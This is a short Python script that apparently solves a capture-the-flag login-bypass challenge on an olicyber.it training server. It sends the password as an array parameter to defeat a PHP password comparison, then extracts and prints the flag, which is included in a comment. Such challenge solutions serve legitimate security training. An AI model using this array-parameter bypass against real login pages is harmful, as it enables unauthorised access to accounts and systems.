import requests
import re

site = "http://ennesimo_login_bypass.challs.olicyber.it/"

r = requests.post(site, data = {"password[]" : "uau"}).text

match = re.search(r'flag\{[^\}]+\}', r)
flag = match.group(0)
print(flag)
#flag{php_v3r510n_8_f1x3d_7h47_f347ur3}
